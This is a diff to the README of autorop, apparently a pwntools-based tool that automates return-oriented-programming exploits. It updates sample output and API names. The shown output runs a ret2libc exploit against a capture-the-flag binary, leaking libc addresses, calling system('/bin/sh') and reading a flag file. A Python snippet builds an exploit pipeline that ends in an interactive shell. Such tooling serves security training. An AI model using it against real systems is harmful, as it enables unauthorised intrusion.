@@ -23,25 +23,21 @@ Command line
 .. code-block:: text
 
     $ autorop tests/bamboofox/ret2libc bamboofox.cs.nctu.edu.tw 11002
-    [+] Opening connection to bamboofox.cs.nctu.edu.tw on port 11002: Done
-    [*] '/data/Projects/autorop/tests/bamboofox/ret2libc'
+    [*] '/home/mariusz/Projects/autorop/tests/bamboofox/ret2libc'
         Arch:     i386-32-little
         RELRO:    Partial RELRO
         Stack:    No canary found
         NX:       NX enabled
         PIE:      No PIE (0x8048000)
-    [*] Pipeline [1/4]: corefile
+    [*] Produced pipeline: Classic(Corefile(), OpenTarget(), Puts(False, ['__libc_start_main', 'puts']), Auto(), SystemBinSh())
+    [*] Pipeline [1/5]: Corefile()
+    [+] Starting local process 'tests/bamboofox/ret2libc': pid 18833
+    [*] Process 'tests/bamboofox/ret2libc' stopped with exit code -11 (SIGSEGV) (pid 18833)
     ...
-    [*] Pipeline [4/4]: system_binsh
-    [*] Loaded 151 cached gadgets for '.autorop.libc'
-    [*] 0x0000:       0xf7e09e70 system(0xf7f29fcc)
-        0x0004:       0xf7df7bfa <adjust @0xc> add esp, 4; ret
-        0x0008:       0xf7f29fcc arg0
-        0x000c:        0x80484ed main()
     [*] Switching to interactive mode
     Hello!
     The address of "/bin/sh" is 0x804a02c
-    The address of function "puts" is 0xf7e2eda0
+    The address of function "puts" is 0xf7e43da0
     $ wc -c /home/ctf/flag
     57 /home/ctf/flag
 
@@ -51,9 +47,9 @@ API
 
 Importing autorop automatically does a ``from pwn import *``, so you can use all of `pwntools' goodies <https://docs.pwntools.com/en/latest/>`_.
 
-Central to autorop's design is the `pipeline <https://en.wikipedia.org/wiki/Pipeline_(software)>`_. Most functions take in a ``PwnState``, and pass it on to the next function with some attributes changed. ``pipeline`` copies\* the ``PwnState`` between each function so mutations are safe. This allows great simplicity and flexibility.
+Central to autorop's design is the `pipeline <https://en.wikipedia.org/wiki/Pipeline_(software)>`_. Most functions take in a ``PwnState``, and pass it on to the next function with some attributes changed. ``Pipeline`` copies\* the ``PwnState`` between each function so mutations are safe. This allows great simplicity and flexibility.
 
-See how the below example neatly manages to "downgrade" the problem from something unique, to something generic that the ``classic`` pipeline can handle.
+See how the below example neatly manages to "downgrade" the problem from something unique, to something generic that the ``Classic`` pipeline can handle.
 
 .. code-block:: python
 
@@ -75,7 +71,7 @@ See how the below example neatly manages to "downgrade" the problem from somethi
     s.overwriter = send_letter_first
 
     # use base classic pipeline, with printf for leaking
-    pipeline = turnkey.classic(leak=leak.Printf())
+    pipeline = turnkey.Classic(leak=leak.Printf())
     result = pipeline(s)
 
     # switch to interactive shell which we got via the exploit
